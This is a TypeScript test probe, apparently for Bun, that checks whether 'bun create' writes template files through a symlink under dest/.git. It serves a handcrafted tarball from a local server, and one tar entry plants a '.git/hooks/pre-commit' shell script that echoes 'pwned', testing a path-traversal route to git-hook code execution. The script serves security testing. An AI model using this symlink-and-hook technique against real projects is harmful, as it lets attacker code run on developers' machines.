// bun create: a symlink below dest/.git and a template entry below it. argv: <bun under test>
import { tls } from "/workspace/bun/test/harness.ts";
import { gzipSync } from "node:zlib";
import { mkdirSync, mkdtempSync, readdirSync, symlinkSync } from "node:fs";
import { join } from "node:path";
const bun = process.argv[2];
const tarEntry = (name: string, body: Buffer) => {
  const buf = Buffer.alloc(512 + ((body.length + 511) & ~511));
  const header = buf.subarray(0, 512);
  header.write(name);
  header.write("0000644", 100);
  header.write("0000000", 108);
  header.write("0000000", 116);
  header.write(body.length.toString(8).padStart(11, "0"), 124);
  header.write("00000000000", 136);
  header.write("        ", 148);
  header.write("0", 156);
  header.write("ustar\0", 257);
  header.write("00", 263);
  let sum = 0;
  for (const b of header) sum += b;
  header.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
  body.copy(buf, 512);
  return buf;
};
const gz = gzipSync(Buffer.concat([
  tarEntry("pkg/a.txt", Buffer.from("a")),
  tarEntry("pkg/.git/hooks/pre-commit", Buffer.from("#!/bin/sh\necho pwned\n")),
  tarEntry("pkg/z.txt", Buffer.from("z")),
  Buffer.alloc(1024),
]));
using server = Bun.serve({ tls, port: 0, fetch: () => new Response(gz, { headers: { "content-type": "application/x-gzip" } }) });
const cwd = mkdtempSync("/tmp/arc/probe/create/hole-");
mkdirSync(join(cwd, "dest", ".git"), { recursive: true });
mkdirSync(join(cwd, "outside"));
symlinkSync("../../outside", join(cwd, "dest", ".git", "hooks"));
const proc = Bun.spawn({
  cmd: [bun, "create", "github.com/owner/tpl", "dest", "--no-install", "--no-git"],
  cwd, stdout: "pipe", stderr: "pipe",
  env: { ...process.env, BUN_DEBUG_QUIET_LOGS: "1", NODE_TLS_REJECT_UNAUTHORIZED: "0", GITHUB_API_DOMAIN: `${server.hostname}:${server.port}` },
});
const [out, err, code] = await Promise.all([proc.stdout.text(), proc.stderr.text(), proc.exited]);
console.log(JSON.stringify({ exit: code, outside: readdirSync(join(cwd, "outside")), dest: readdirSync(join(cwd, "dest")).sort(), stderrTail: err.trim().split("\n").slice(-2).join(" | ").slice(0, 200) }));
